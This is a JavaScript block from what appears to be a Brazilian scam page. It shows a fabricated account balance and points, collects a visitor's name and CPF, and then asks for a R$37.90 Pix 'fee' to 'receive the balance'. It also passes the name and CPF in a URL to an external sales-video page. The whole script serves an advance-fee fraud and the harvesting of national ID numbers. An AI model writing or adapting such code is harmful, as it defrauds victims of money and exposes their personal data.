<script>
        // ⚠️ COLOQUE SEU LINK DO RAILWAY AQUI (Sem a barra no final)
        // Exemplo: "https://checkout-pix-profissional.up.railway.app"
        const API = ""; 

        // Se deixar vazio (""), ele tenta usar o próprio site.
        // Se você estiver testando no computador (arquivo local), ISSO NÃO FUNCIONA.
        // Nesse caso, TEM QUE COLOCAR O LINK DO RAILWAY.

        function logDebug(msg) {
            console.log(msg);
            // Opcional: Mostra na tela se quiser debugar pesado
            // alert("DEBUG: " + msg); 
        }

        async function gerarPixAPI() {
            const btn = document.getElementById('btn-final');
            const nome = document.getElementById('input-nome').value;
            // Limpa CPF e garante 11 digitos ou usa teste
            let cpfRaw = document.getElementById('input-chave').value.replace(/\D/g, '');
            if (!cpfRaw || cpfRaw.length < 11) cpfRaw = "12345678909"; // CPF de Teste Válido

            btn.disabled = true; 
            btn.innerText = "CONECTANDO...";

            logDebug("Iniciando tentativa de Pix...");
            logDebug("API Destino: " + (API || window.location.origin));

            try {
                // Tenta conectar
                const response = await fetch(`${API}/pix`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        amount: 37.90, 
                        name: nome, 
                        cpf: cpfRaw,
                        email: "cliente@teste.com"
                    })
                });

                logDebug("Resposta do Servidor: " + response.status);

                if (!response.ok) {
                    // Se o servidor devolveu erro, vamos ler o texto
                    const textoErro = await response.text();
                    throw new Error(`Erro ${response.status}: ${textoErro}`);
                }

                const json = await response.json();
                
                if (json.point_of_interaction) {
                    const qrCode = json.point_of_interaction.transaction_data.qr_code;
                    const imgBase64 = json.point_of_interaction.transaction_data.qr_code_base64;

                    document.getElementById('qr-img').src = `data:image/png;base64,${imgBase64}`;
                    document.getElementById('pix-copy').value = qrCode;
                    document.getElementById('modal-qr').classList.remove('hidden');
                } else {
                    throw new Error("JSON inválido: " + JSON.stringify(json));
                }

            } catch (erro) {
                // AQUI ESTÁ A SOLUÇÃO: O ERRO VAI APARECER NA SUA TELA
                alert("❌ FALHA NO ENVIO:\n\n" + erro.message);
                console.error(erro);
            } finally {
                btn.disabled = false;
                btn.innerText = "PAGAR TAXA E RECEBER SALDO";
            }
        }

        // Funções auxiliares (Animação, Modal, etc) mantidas...
        function anim(id, val) { let cur=0, el=document.getElementById(id), step=val/40, t=setInterval(()=>{ cur+=step; if(cur>=val){ el.innerText=val.toLocaleString('pt-BR',{minimumFractionDigits:2}); clearInterval(t); }else el.innerText=cur.toLocaleString('pt-BR',{minimumFractionDigits:2}); },30); }
        window.onload = () => { anim('balance', 1489.38); anim('points', 42583.05); };
        let sel=false;
        function selectOpt(e) { document.querySelectorAll('.option-btn,.big-option').forEach(b=>b.classList.remove('selected')); e.classList.add('selected'); sel=true; document.getElementById('btn-sacar').classList.remove('btn-disabled'); }
        function selectBig() { selectOpt(document.getElementById('big-opt')); }
        function openModalData() { if(sel) document.getElementById('modal-data').classList.remove('hidden'); }
        function maskKey() { let t=document.getElementById('input-tipo').value, i=document.getElementById('input-chave'); i.value=""; i.placeholder = (t==='cpf') ? "000.000.000-00" : "Chave Pix"; }
        document.getElementById('input-chave').addEventListener('input', function(e){ if(document.getElementById('input-tipo').value==='cpf') e.target.value = e.target.value.replace(/\D/g,"").replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d{1,2})$/,"$1-$2"); });
        function goToConfirm() {
            let n=document.getElementById('input-nome').value, c=document.getElementById('input-chave').value;
            if(n.length<3 || c.length<4) return alert("Preencha corretamente.");
            document.getElementById('txt-nome').innerText = n; document.getElementById('txt-chave').innerText = c;
            document.getElementById('modal-data').classList.add('hidden'); document.getElementById('screen-1').classList.add('hidden'); document.getElementById('screen-confirm').classList.remove('hidden');
        }
        function goToVSL() {
            let n=document.getElementById('input-nome').value, c=document.getElementById('input-chave').value.replace(/\D/g,'') || "00000000000";
            document.querySelector('.vsl-frame').src = `https://recuperabonushopp.com/elementor-1623?nome=${encodeURIComponent(n)}&cpf=${c}`;
            document.getElementById('screen-confirm').classList.add('hidden'); document.getElementById('screen-vsl').classList.remove('hidden');
        }
        function copyCode() { document.getElementById('pix-copy').select(); document.execCommand('copy'); alert("Copiado!"); }
    </script>